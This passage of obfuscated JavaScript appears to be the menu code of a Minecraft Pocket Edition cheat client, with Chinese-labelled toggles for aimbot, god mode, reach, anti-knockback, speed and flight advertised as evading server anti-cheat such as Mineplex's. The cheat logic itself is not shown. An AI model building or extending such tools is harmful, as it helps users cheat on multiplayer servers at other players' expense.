                _0x2bf6x13e['setTextOn']('自瞄');
                _0x2bf6x13e['setTextOff']('自瞄');
                _0x2bf6x13e['setChecked'](saimed);
                _0x2bf6x13e['setTextSize'](18);
                _0x2bf6x13e['setBackground'](bg);
                _0x2bf6x13e['getBackground']()['setAlpha'](150);
                _0x2bf6x13e['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x13e['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!saimed) {
                            saimed = true;
                            aimbotss = true;
                            _0x2bf6x13e['setBackground'](abg)
                        } else {
                            saimed = false;
                            aimbotss = false;
                            _0x2bf6x13e['setBackground'](bg)
                        };
                        _0x2bf6x13e['setChecked'](saimed)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x13e);
                GUIa = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIa['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIa['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['RIGHT'] | Gravity['TOP'], 150 * 3, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showF5Btn() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x140 = 0;
                var _0x2bf6x141 = new Button(ctx);
                _0x2bf6x141['setText']('切换视角');
                _0x2bf6x141['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x141['setBackground'](theme);
                _0x2bf6x141['getBackground']()['setAlpha'](150);
                _0x2bf6x141['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x140++;
                        if (_0x2bf6x140 > 2) {
                            _0x2bf6x140 = 0
                        };
                        ModPE['setPlayerViewPerspective'](_0x2bf6x140)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x141);
                GUIv = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIv['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIv['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['BOTTOM'], 0, 0)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showZoomSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x143 = new android['widget'].ToggleButton(ctx);
                _0x2bf6x143['setText']('放大');
                _0x2bf6x143['setTextOn']('放大');
                _0x2bf6x143['setTextOff']('放大');
                _0x2bf6x143['setChecked'](zoomed);
                _0x2bf6x143['setTextSize'](18);
                _0x2bf6x143['setBackground'](bg);
                _0x2bf6x143['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x143['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!zoomed) {
                            zoomed = true;
                            ModPE['setFov'](20);
                            _0x2bf6x143['setBackground'](abg)
                        } else {
                            ModPE['resetFov']();
                            zoomed = false;
                            _0x2bf6x143['setBackground'](bg)
                        };
                        _0x2bf6x143['setChecked'](zoomed)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x143);
                GUIz = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIz['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIz['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['TOP'], 3, 100)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function showRegenSwitch() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x130 = new LinearLayout(ctx);
                _0x2bf6x130['setOrientation'](1);
                var _0x2bf6x145 = new android['widget'].ToggleButton(ctx);
                _0x2bf6x145['setText']('定');
                _0x2bf6x145['setTextOn']('定');
                _0x2bf6x145['setTextOff']('定');
                _0x2bf6x145['setChecked'](sregened);
                _0x2bf6x145['setTextSize'](18);
                _0x2bf6x145['setBackground'](bg);
                _0x2bf6x145['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x145['setOnClickListener'](new android['view']['View'].OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        if (!sregened) {
                            sregened = true;
                            sregenss = true;
                            _0x2bf6x145['setBackground'](abg)
                        } else {
                            sregened = false;
                            sregenss = false;
                            _0x2bf6x145['setBackground'](bg);
                            ModPE['setGameSpeed'](20);
                            Entity['setImmobile'](Player['getEntity'](), false)
                        };
                        _0x2bf6x145['setChecked'](sregened)
                    }
                }));
                _0x2bf6x130['addView'](_0x2bf6x145);
                GUIg = new PopupWindow(_0x2bf6x130, RelativeLayout['LayoutParams'].WRAP_CONTENT, RelativeLayout['LayoutParams'].WRAP_CONTENT);
                GUIg['setBackgroundDrawable'](new ColorDrawable(Color.TRANSPARENT));
                GUIg['showAtLocation'](ctx['getWindow']()['getDecorView'](), Gravity['LEFT'] | Gravity['TOP'], 3, 230)
            } catch (err) {
                Toast['makeText'](ctx, 'An error occured: ' + err, 1)['show']()
            }
        }
    }))
}

function mainMenu() {
    ctx['runOnUiThread'](new Runnable({
        run: function() {
            try {
                var _0x2bf6x147 = new LinearLayout(ctx);
                var _0x2bf6x148 = new ScrollView(ctx);
                var _0x2bf6x149 = new LinearLayout(ctx);
                _0x2bf6x147['setOrientation'](1);
                _0x2bf6x147['setBackground'](theme1);
                _0x2bf6x147['getBackground']()['setAlpha'](150);
                _0x2bf6x149['setOrientation'](1);
                _0x2bf6x148['addView'](_0x2bf6x147);
                _0x2bf6x149['addView'](_0x2bf6x148);
                var scrollText = new android.widget.TextView(ctx);

                scrollText.setText("欢迎加入꯭꯭醉꯭仙꯭网꯭络꯭，群聊号码：716069766");

                scrollText.setTextSize(18);
                scrollText.setTextColor(android.graphics.Color.MAGENTA);

                scrollText.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.RED));
                scrollText.getBackground().setAlpha(150);

                scrollText.setEllipsize(android.text.TextUtils.TruncateAt.MARQUEE);

                scrollText.setMarqueeRepeatLimit(-1);

                scrollText.setSingleLine();

                scrollText.setHorizontallyScrolling(true);

                scrollText.setSelected(true);

                _0x2bf6x147['addView'](scrollText);
                var _0x2bf6x14a = new TextView(ctx);
                _0x2bf6x14a['setTextSize'](20);
                _0x2bf6x14a['setText'](NAME + ' ' + VERSION);
                _0x2bf6x14a['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x14a['setGravity'](Gravity.CENTER);
                _0x2bf6x147['addView'](_0x2bf6x14a);
                var _0x2bf6x14b = new TextView(ctx);
                _0x2bf6x14b['setTextSize'](15);
                _0x2bf6x14b['setText']('枫枫 喜欢你 版本' + MODULES);
                _0x2bf6x14b['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                _0x2bf6x14b['setGravity'](Gravity.CENTER);
                _0x2bf6x147['addView'](_0x2bf6x14b);
                var _0x2bf6x14c = new TextView(ctx);
                _0x2bf6x14c['setText']('战斗');
                _0x2bf6x14c['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x14c['setTextSize'](24);
                _0x2bf6x14c['setBackground'](theme);
                _0x2bf6x14c['getBackground']()['setAlpha'](100);
                _0x2bf6x14c['setGravity'](Gravity.CENTER);
                _0x2bf6x14c['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x14d();
                        exitcombat();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x14c);

                function _0x2bf6x14d() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x14e = new TextView(ctx);
                                _0x2bf6x14e['setTextSize'](20);
                                _0x2bf6x14e['setText']('-| 战斗 |-');
                                _0x2bf6x14e['setTextColor'](android['graphics']['Color'].MAGENTA);
                                _0x2bf6x14e['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x14e['getBackground']()['setAlpha'](120);
                                _0x2bf6x14e['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x14e);

                                var godmode = new Switch(ctx);
                                godmode['setText']('上帝模式');
                                godmode['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                godmode['setPadding'](10, 3, 3, 3);
                                godmode['setTextSize'](15);
                                godmode['setBackground'](module);
                                godmode['getBackground']()['setAlpha'](120);
                                godmode['setChecked'](godmodeed);
                                godmode['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!godmodeed) {
                                            godmodes = true;
                                            godmodeed = true
                                        } else {
                                            godmodes = false;
                                            godmodeed = false
                                        };
                                        godmode['setChecked'](godmodeed)
                                    }
                                }));
                                _0x2bf6x147['addView'](godmode);

                                var bypasshitbox = new Switch(ctx);
                                bypasshitbox['setText']('旁路碰撞箱');
                                bypasshitbox['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bypasshitbox['setPadding'](10, 3, 3, 3);
                                bypasshitbox['setTextSize'](15);
                                bypasshitbox['setBackground'](module);
                                bypasshitbox['getBackground']()['setAlpha'](120);
                                bypasshitbox['setChecked'](bypasshitboxed);
                                bypasshitbox['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bypasshitboxed) {
                                            bypasshitboxs = true;
                                            bypasshitboxed = true;
                                            bypasshitbox['setBackground'](bg);
                                        } else {
                                            bypasshitboxs = false;
                                            bypasshitboxed = false
                                            bypasshitbox['setBackground'](module);
                                        };
                                        bypasshitbox['setChecked'](bypasshitboxed)
                                    }
                                }));
                                _0x2bf6x147['addView'](bypasshitbox);

                                var hitbox = new Switch(ctx);
                                hitbox['setText']('命中');
                                hitbox['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                hitbox['setPadding'](10, 3, 3, 3);
                                hitbox['setTextSize'](15);
                                hitbox['setBackground'](module);
                                hitbox['getBackground']()['setAlpha'](120);
                                hitbox['setChecked'](hitboxed);
                                hitbox['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!hitboxed) {
                                            hitboxs = true;
                                            hitboxed = true;
                                            hitbox['setBackground'](bg);
                                        } else {
                                            hitboxs = false;
                                            hitboxed = false
                                            hitbox['setBackground'](module);
                                        };
                                        hitbox['setChecked'](hitboxed)
                                    }
                                }));
                                _0x2bf6x147['addView'](hitbox);

                                var aimbots = new Switch(ctx);
                                aimbots['setText']('自瞄');
                                aimbots['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                aimbots['setPadding'](10, 3, 3, 3);
                                aimbots['setTextSize'](15);
                                aimbots['setBackground'](module);
                                aimbots['getBackground']()['setAlpha'](120);
                                aimbots['setChecked'](aimboted);
                                aimbots['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!aimboted) {
                                            aimbotss = true;
                                            aimboted = true;
                                            aimbots['setBackground'](bg);
                                        } else {
                                            aimbotss = false;
                                            aimboted = false
                                            aimbots['setBackground'](module);
                                        };
                                        aimbots['setChecked'](aimboted)
                                    }
                                }));
                                _0x2bf6x147['addView'](aimbots);
                                var switchaims = new Switch(ctx);
                                switchaims['setText']('自瞄');
                                switchaims['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                switchaims['setPadding'](10, 3, 3, 3);
                                switchaims['setTextSize'](15);
                                switchaims['setBackground'](module);
                                switchaims['getBackground']()['setAlpha'](120);
                                switchaims['setChecked'](switchaimed);
                                switchaims['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!switchaimed) {
                                            showAimSwitch();
                                            switchaimed = true
                                            switchaims['setBackground'](bg);
                                        } else {
                                            if (GUIa != null && GUIa['isShowing']()) {
                                                GUIa['dismiss']()
                                            };
                                            switchaimed = false;
                                            aimbotss = false;
                                            saimed = false
                                            switchaims['setBackground'](module);
                                        };
                                        switchaims['setChecked'](switchaimed)
                                    }
                                }));
                                _0x2bf6x147['addView'](switchaims);
                                var aimassists = new Switch(ctx);
                                aimassists['setText']('生物自瞄');
                                aimassists['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                aimassists['setPadding'](10, 3, 3, 3);
                                aimassists['setTextSize'](15);
                                aimassists['setBackground'](module);
                                aimassists['getBackground']()['setAlpha'](120);
                                aimassists['setChecked'](aimassisted);
                                aimassists['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!aimassisted) {
                                            aimassistss = true;
                                            aimassisted = true
                                            fctoast('必须附近有生物才行哦')
                                            aimassists['setBackground'](bg);
                                        } else {
                                            aimassistss = false;
                                            aimassisted = false
                                            aimassists['setBackground'](module);
                                        };
                                        aimassists['setChecked'](aimassisted)
                                    }
                                }));
                                _0x2bf6x147['addView'](aimassists);
                                var reachs = new Switch(ctx);
                                reachs['setText']('攻击传送');
                                reachs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                reachs['setPadding'](10, 3, 3, 3);
                                reachs['setTextSize'](15);
                                reachs['setBackground'](module);
                                reachs['getBackground']()['setAlpha'](120);
                                reachs['setChecked'](reached);
                                reachs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!reached) {
                                            reachss = true;
                                            reached = true
                                            reachs['setBackground'](bg);
                                        } else {
                                            reachss = false;
                                            reached = false;
                                            Level['setGameMode'](0)
                                            reachs['setBackground'](module);
                                        };
                                        reachs['setChecked'](reached)
                                    }
                                }));
                                _0x2bf6x147['addView'](reachs);
                                var sidereachs = new Switch(ctx);
                                sidereachs['setText']('画面缩放');
                                sidereachs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                sidereachs['setPadding'](10, 3, 3, 3);
                                sidereachs['setTextSize'](15);
                                sidereachs['setBackground'](module);
                                sidereachs['getBackground']()['setAlpha'](120);
                                sidereachs['setChecked'](sidereached);
                                sidereachs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!sidereached) {
                                            ModPE['setFov'](115);
                                            sidereached = true;
                                            sidereachs['setBackground'](bg);
                                        } else {
                                            ModPE['resetFov']();
                                            sidereached = false;
                                            Level['setGameMode'](0)
                                            sidereachs['setBackground'](module);
                                        };
                                        sidereachs['setChecked'](sidereached)
                                    }
                                }));
                                _0x2bf6x147['addView'](sidereachs);
                                var switchreachs = new Switch(ctx);
                                switchreachs['setText']('增加攻击距离');
                                switchreachs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                switchreachs['setPadding'](10, 3, 3, 3);
                                switchreachs['setTextSize'](15);
                                switchreachs['setBackground'](module);
                                switchreachs['getBackground']()['setAlpha'](120);
                                switchreachs['setChecked'](switchreached);
                                switchreachs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!switchreached) {
                                            showReachSwitch();
                                            switchreached = true
                                            fctoast('随枫吖:由于相关原因，真正的长臂猿是reach，而不是hitbox，他是通过切换模式来改变距离的，所有服务器可能无效')
                                            switchreachs['setBackground'](bg);
                                        } else {
                                            if (GUIr != null && GUIr['isShowing']()) {
                                                GUIr['dismiss']()
                                            };
                                            switchreached = false;
                                            sreached = false
                                            switchreachs['setBackground'](module);
                                        };
                                        switchreachs['setChecked'](switchreached)
                                    }
                                }));
                                _0x2bf6x147['addView'](switchreachs);
                                var antikbs = new Switch(ctx);
                                antikbs['setText']('反速度-无击退');
                                antikbs['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                antikbs['setPadding'](10, 3, 3, 3);
                                antikbs['setTextSize'](15);
                                antikbs['setBackground'](module);
                                antikbs['getBackground']()['setAlpha'](120);
                                antikbs['setChecked'](antikbed);
                                antikbs['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!antikbed) {
                                            antikbss = true;
                                            antikbed = true
                                            antikbs['setBackground'](bg);
                                        } else {
                                            antikbss = false;
                                            antikbed = false
                                            antikbs['setBackground'](module);
                                        };
                                        antikbs['setChecked'](antikbed)
                                    }
                                }));
                                _0x2bf6x147['addView'](antikbs);
                                var grapples = new Switch(ctx);
                                grapples['setText']('瞬移光环');
                                grapples['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                grapples['setPadding'](10, 3, 3, 3);
                                grapples['setTextSize'](15);
                                grapples['setBackground'](module);
                                grapples['getBackground']()['setAlpha'](120);
                                grapples['setChecked'](grappleed);
                                grapples['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!grappleed) {
                                            grappless = true;
                                            grappleed = true
                                            grapples['setBackground'](bg);
                                        } else {
                                            grappless = false;
                                            grappleed = false
                                            grapples['setBackground'](module);
                                        };
                                        grapples['setChecked'](grappleed)
                                    }
                                }));
                                _0x2bf6x147['addView'](grapples);
                                var ghosthands = new Switch(ctx);
                                ghosthands['setText']('点击破坏');
                                ghosthands['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                ghosthands['setPadding'](10, 3, 3, 3);
                                ghosthands['setTextSize'](15);
                                ghosthands['setBackground'](module);
                                ghosthands['getBackground']()['setAlpha'](120);
                                ghosthands['setChecked'](ghosthanded);
                                ghosthands['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!ghosthanded) {
                                            ghosthandss = true;
                                            ghosthanded = true;
                                            fctoast('用手点击方块，然后破坏，注意方块不会消失哦')
                                            ghosthands['setBackground'](bg);
                                        } else {
                                            ghosthandss = false;
                                            ghosthanded = false
                                            ghosthands['setBackground'](module);
                                        };
                                        ghosthands['setChecked'](ghosthanded)
                                    }
                                }));
                                _0x2bf6x147['addView'](ghosthands);
                                var criticalss = new Switch(ctx);


                                criticalss['setText']('刀刀暴击');
                                criticalss['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                criticalss['setPadding'](10, 3, 3, 3);
                                criticalss['setTextSize'](15);
                                criticalss['setBackground'](module);
                                criticalss['getBackground']()['setAlpha'](120);
                                criticalss['setChecked'](criticalsed);
                                criticalss['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!criticalsed) {
                                            criticales = true;
                                            criticalsed = true
                                            criticalss['setBackground'](bg);
                                        } else {
                                            criticales = false;
                                            criticalsed = false
                                            criticalss['setBackground'](module);
                                        };
                                        criticalss['setChecked'](criticalsed)
                                    }
                                }));
                                _0x2bf6x147['addView'](criticalss);
                                var escapes = new Switch(ctx);
                                escapes['setText']('闪现');
                                escapes['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                escapes['setPadding'](10, 3, 3, 3);
                                escapes['setTextSize'](15);
                                escapes['setBackground'](module);
                                escapes['getBackground']()['setAlpha'](120);
                                escapes['setChecked'](escapeed);
                                escapes['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!escapeed) {
                                            showEscapeBtn();
                                            escapeed = true
                                            escapes['setBackground'](bg);
                                        } else {
                                            GUIs['dismiss']();
                                            escapeed = false
                                            escapes['setBackground'](module);
                                        };
                                        escapes['setChecked'](escapeed)
                                    }
                                }));
                                _0x2bf6x147['addView'](escapes);
                                var arrowdodges = new Switch(ctx);
                                arrowdodges['setText']('自动躲箭');
                                arrowdodges['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                arrowdodges['setPadding'](10, 3, 3, 3);
                                arrowdodges['setTextSize'](15);
                                arrowdodges['setBackground'](module);
                                arrowdodges['getBackground']()['setAlpha'](120);
                                arrowdodges['setChecked'](arrowdodgeed);
                                arrowdodges['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!arrowdodgeed) {
                                            arrowdodgess = true;
                                            arrowdodgeed = true;
                                            fctoast('当有箭靠进你的时候，可以自动躲避')
                                            arrowdodges['setBackground'](bg);
                                        } else {
                                            arrowdodgess = false;
                                            arrowdodgeed = false
                                            arrowdodges['setBackground'](module);
                                        };
                                        arrowdodges['setChecked'](arrowdodgeed)
                                    }
                                }));
                                _0x2bf6x147['addView'](arrowdodges);
                                var behindhits = new Switch(ctx);
                                behindhits['setText']('快速攻击');
                                behindhits['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                behindhits['setPadding'](10, 3, 3, 3);
                                behindhits['setTextSize'](15);
                                behindhits['setBackground'](module);
                                behindhits['getBackground']()['setAlpha'](120);
                                behindhits['setChecked'](behindhited);
                                behindhits['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!behindhited) {
                                            behindhitss = true;
                                            behindhited = true
                                            behindhits['setBackground'](bg);
                                        } else {
                                            behindhitss = false;
                                            behindhited = false
                                            behindhits['setBackground'](module);
                                        };
                                        behindhits['setChecked'](behindhited)
                                    }
                                }));
                                _0x2bf6x147['addView'](behindhits);
                                var bowaimbots = new Switch(ctx);
                                bowaimbots['setText']('自瞄弓');
                                bowaimbots['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                bowaimbots['setPadding'](10, 3, 3, 3);
                                bowaimbots['setTextSize'](15);
                                bowaimbots['setBackground'](module);
                                bowaimbots['getBackground']()['setAlpha'](120);
                                bowaimbots['setChecked'](bowaimboted);
                                bowaimbots['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!bowaimboted) {
                                            bowaimboted = true;
                                            bowaimbotss = true
                                            bowaimbots['setBackground'](bg);
                                        } else {
                                            bowaimboted = false;
                                            bowaimbotss = false
                                            bowaimbots['setBackground'](module);
                                        };
                                        bowaimbots['setChecked'](bowaimboted)
                                    }
                                }));
                                _0x2bf6x147['addView'](bowaimbots);
                                var snipers = new Switch(ctx);
                                snipers['setText']('自瞄弓[专业版]');
                                snipers['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                snipers['setPadding'](10, 3, 3, 3);
                                snipers['setTextSize'](15);
                                snipers['setBackground'](module);
                                snipers['getBackground']()['setAlpha'](120);
                                snipers['setChecked'](snipered);
                                snipers['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!snipered) {
                                            sniperss = true;
                                            snipered = true
                                            fctoast('拿起弓箭自动放大画面，进行射击')
                                            snipers['setBackground'](bg);
                                        } else {
                                            ModPE['resetFov']();
                                            sniperss = false;
                                            snipered = false
                                            snipers['setBackground'](module);
                                        };
                                        snipers['setChecked'](snipered)
                                    }
                                }));
                                _0x2bf6x147['addView'](snipers);
                                var autoswords = new Switch(ctx);
                                autoswords['setText']('自动切剑');
                                autoswords['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                autoswords['setPadding'](10, 3, 3, 3);
                                autoswords['setTextSize'](15);
                                autoswords['setBackground'](module);
                                autoswords['getBackground']()['setAlpha'](120);
                                autoswords['setChecked'](autosworded);
                                autoswords['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!autosworded) {
                                            autoswordss = true;
                                            autosworded = true
                                            autoswords['setBackground'](bg);
                                        } else {
                                            autoswordss = false;
                                            autosworded = false
                                            autoswords['setBackground'](module);
                                        };
                                        autoswords['setChecked'](autosworded)
                                    }
                                }));
                                _0x2bf6x147['addView'](autoswords);
                                menu1 = new PopupWindow(_0x2bf6x149, ctx['getWindowManager']()['getDefaultDisplay']()['getWidth']() / 4, ctx['getWindowManager']()['getDefaultDisplay']()['getHeight']());
                                menu1['setAnimationStyle'](android['R']['style'].Animation_InputMethod);
                                menu1['showAtLocation'](ctx['getWindow']()['getDecorView'](), 1, 0, 0)
                            } catch (error) {
                                Toast['makeText'](ctx, 'Flqme Error: ' + error, 1)['show']()
                            }
                        }
                    }))
                }
                var _0x2bf6x14f = new TextView(ctx);
                _0x2bf6x14f['setText']('移动');
                _0x2bf6x14f['setTextColor'](Color['rgb'](255, 0, 255));
                _0x2bf6x14f['setTextSize'](24);
                _0x2bf6x14f['setBackground'](theme);
                _0x2bf6x14f['getBackground']()['setAlpha'](100);
                _0x2bf6x14f['setGravity'](Gravity.CENTER);
                _0x2bf6x14f['setOnClickListener'](new View.OnClickListener({
                    onClick: function(_0x2bf6x132) {
                        _0x2bf6x150();
                        exitmotion();
                        if (menu != null && menu['isShowing']()) {
                            menu['dismiss']()
                        };
                        if (GUI != null && GUI['isShowing']()) {
                            GUI['dismiss']()
                        };
                        exitUI['dismiss']()
                    }
                }));
                _0x2bf6x147['addView'](_0x2bf6x14f);

                function _0x2bf6x150() {
                    ctx['runOnUiThread'](new Runnable({
                        run: function() {
                            try {
                                var _0x2bf6x147 = new LinearLayout(ctx);
                                var _0x2bf6x148 = new ScrollView(ctx);
                                var _0x2bf6x149 = new LinearLayout(ctx);
                                _0x2bf6x147['setOrientation'](1);
                                _0x2bf6x147['setBackground'](theme);
                                _0x2bf6x147['getBackground']()['setAlpha'](120);
                                _0x2bf6x149['setOrientation'](1);
                                _0x2bf6x148['addView'](_0x2bf6x147);
                                _0x2bf6x149['addView'](_0x2bf6x148);
                                var _0x2bf6x151 = new TextView(ctx);
                                _0x2bf6x151['setTextSize'](20);
                                _0x2bf6x151['setText']('-| 移动 |-');
                                _0x2bf6x151['setTextColor'](android['graphics']['Color'].MAGENTA);
                                _0x2bf6x151['setBackgroundDrawable'](new ColorDrawable(Color.BLACK));
                                _0x2bf6x151['getBackground']()['setAlpha'](120);
                                _0x2bf6x151['setGravity'](Gravity.CENTER);
                                _0x2bf6x147['addView'](_0x2bf6x151);

                                var inpvpfly = new Switch(ctx);
                                inpvpfly['setText']('Inpvp飞行');
                                inpvpfly['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                inpvpfly['setPadding'](10, 3, 3, 3);
                                inpvpfly['setTextSize'](15);
                                inpvpfly['setBackground'](module);
                                inpvpfly['getBackground']()['setAlpha'](120);
                                inpvpfly['setChecked'](inpvpflyed);
                                inpvpfly['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!inpvpflyed) {
                                            inpvpflys = true;
                                            inpvpflyed = true
                                        } else {
                                            inpvpflys = false;
                                            inpvpflyed = false
                                        };
                                        inpvpfly['setChecked'](inpvpflyed)
                                    }
                                }));
                                _0x2bf6x147['addView'](inpvpfly);

                                var mineplexspeed = new Switch(ctx);
                                mineplexspeed['setText']('速度增加');
                                mineplexspeed['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                mineplexspeed['setPadding'](10, 3, 3, 3);
                                mineplexspeed['setTextSize'](15);
                                mineplexspeed['setBackground'](module);
                                mineplexspeed['getBackground']()['setAlpha'](120);
                                mineplexspeed['setChecked'](mineplexspeeded);
                                mineplexspeed['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
                                        if (!mineplexspeeded) {
                                            mineplexspeeds = true;
                                            mineplexspeeded = true
                                            ModPE['setGameSpeed'](48)
                                            fctoast('随枫吖:和Mineplex速度一样(如果反作弊更新后，就不可以了)')
                                        } else {
                                            mineplexspeeds = false;
                                            mineplexspeeded = false
                                            ModPE['setGameSpeed'](20)
                                        };
                                        mineplexspeed['setChecked'](mineplexspeeded)
                                    }
                                }));
                                _0x2bf6x147['addView'](mineplexspeed);

                                var mineplexfly = new Switch(ctx);
                                mineplexfly['setText']('飞行[绕过检测]');
                                mineplexfly['setTextColor'](android['graphics']['Color']['rgb'](255, 0, 255));
                                mineplexfly['setPadding'](10, 3, 3, 3);
                                mineplexfly['setTextSize'](15);
                                mineplexfly['setBackground'](module);
                                mineplexfly['getBackground']()['setAlpha'](120);
                                mineplexfly['setChecked'](mineplexflyed);
                                mineplexfly['setOnCheckedChangeListener'](new android['widget']['CompoundButton'].OnCheckedChangeListener({
                                    onCheckedChanged: function() {
